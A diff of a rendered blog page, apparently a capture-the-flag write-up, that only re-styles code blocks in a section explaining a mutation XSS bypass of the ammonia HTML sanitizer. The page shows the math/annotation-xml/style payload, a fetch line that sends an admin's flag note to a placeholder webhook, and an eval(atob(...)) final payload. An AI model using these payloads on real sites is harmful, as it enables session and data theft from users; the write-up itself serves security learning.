@@ -106,7 +106,7 @@
     
     
 
-<link type="text/css" rel="stylesheet" href="/css/bundle.min.e2cd7bb31175229efffd2db21407e5f6ecab44bbd0fcaef56c6905dc3285f85e.css">
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.0116cf0f609eb527b85b49d8ffe467707a64be5e30ae09f6e6ca742edf46e161.css">
 
 
     
@@ -534,17 +534,17 @@ Otherwise, it is parsed as foreign content and parsed in a more XML-like manner 
 <h2 id="mxss-explanation">mXSS Explanation</h2>
 <p><code>&lt;math&gt;&lt;annotation-xml encoding=&quot;text/html&quot;&gt;&lt;style&gt;&lt;img src=x onerror=&quot;alert(1)&quot;&gt;&lt;/style&gt;&lt;/annotation-xml&gt;&lt;/math&gt;</code></p>
 <p>The above payload can be used to pop an alert on the page. To understand why this works, we can first look at the html that ammonia returns when the payload is parsed.</p>
-<pre tabindex="0"><code>Input - &lt;math&gt;&lt;annotation-xml encoding=&#34;text/html&#34;&gt;&lt;style&gt;&lt;img src=x onerror=&#34;alert(1)&#34;&gt;&lt;/style&gt;&lt;/annotation-xml&gt;&lt;/math&gt;
-Output - &lt;math&gt;&lt;annotation-xml&gt;&lt;style&gt;&lt;img src=x onerror=&#34;alert(1)&#34;&gt;&lt;/style&gt;&lt;/annotation-xml&gt;&lt;/math&gt;
-</code></pre><p><code>encoding=&quot;text/html&quot;</code> treats the <code>style</code> tag in the html namespace and hence, content inside it is treated as plaintext and no filtering is done on it but when the attribute is removed, <code>style</code> tag is now in the <code>mathml</code> namespace where tags within the <code>style</code> tag are considered as html tags.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>Input - &lt;<span style="color:#f92672">math</span>&gt;&lt;<span style="color:#f92672">annotation-xml</span> <span style="color:#a6e22e">encoding</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html&#34;</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">&lt;</span><span style="color:#f92672">img</span> <span style="color:#f92672">src</span><span style="color:#f92672">=</span><span style="color:#f92672">x</span> <span style="color:#f92672">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert(1)&#34;</span><span style="color:#f92672">&gt;</span>&lt;/<span style="color:#f92672">style</span>&gt;&lt;/<span style="color:#f92672">annotation-xml</span>&gt;&lt;/<span style="color:#f92672">math</span>&gt;
+</span></span><span style="display:flex;"><span>Output - &lt;<span style="color:#f92672">math</span>&gt;&lt;<span style="color:#f92672">annotation-xml</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">&lt;</span><span style="color:#f92672">img</span> <span style="color:#f92672">src</span><span style="color:#f92672">=</span><span style="color:#f92672">x</span> <span style="color:#f92672">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert(1)&#34;</span><span style="color:#f92672">&gt;</span>&lt;/<span style="color:#f92672">style</span>&gt;&lt;/<span style="color:#f92672">annotation-xml</span>&gt;&lt;/<span style="color:#f92672">math</span>&gt;
+</span></span></code></pre></div><p><code>encoding=&quot;text/html&quot;</code> treats the <code>style</code> tag in the html namespace and hence, content inside it is treated as plaintext and no filtering is done on it but when the attribute is removed, <code>style</code> tag is now in the <code>mathml</code> namespace where tags within the <code>style</code> tag are considered as html tags.</p>
 <p>Trying out the output in a live-dom viewer such as <a href="https://software.hixie.ch/utilities/js/live-dom-viewer/" target="_blank">https://software.hixie.ch/utilities/js/live-dom-viewer/</a> shows the difference between how the DOM views the input and the output.</p>
 <h3 id="final-steps">Final steps</h3>
 <p>Now that we have XSS, we just have to make the admin visit the <code>/api/note/flag</code> endpoint and send the content to a domain controlled by us.
 For that we can use</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`/api/note/flag`</span>).<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">r</span>)=&gt;<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">text</span>()).<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">r</span>)=&gt;<span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">`&lt;webhook&gt;?a=`</span><span style="color:#f92672">+</span>encodeURIComponent(<span style="color:#a6e22e">r</span>))
 </span></span></code></pre></div><p>Final payload:</p>
-<pre tabindex="0"><code>&lt;math&gt;&lt;annotation-xml encoding=&#34;text/html&#34;&gt;&lt;style&gt;&lt;img src=x onerror=&#34;eval(atob(`&lt;base64 payload`))&#34;&gt;&lt;/style&gt;&lt;/annotation-xml&gt;&lt;/math&gt;
-</code></pre>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">math</span>&gt;&lt;<span style="color:#f92672">annotation-xml</span> <span style="color:#a6e22e">encoding</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html&#34;</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">&lt;</span><span style="color:#f92672">img</span> <span style="color:#f92672">src</span><span style="color:#f92672">=</span><span style="color:#f92672">x</span> <span style="color:#f92672">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;eval(atob(`&lt;base64 payload`))&#34;</span><span style="color:#f92672">&gt;</span>&lt;/<span style="color:#f92672">style</span>&gt;&lt;/<span style="color:#f92672">annotation-xml</span>&gt;&lt;/<span style="color:#f92672">math</span>&gt;
+</span></span></code></pre></div>
   
   <hr>
 <div class="footer">
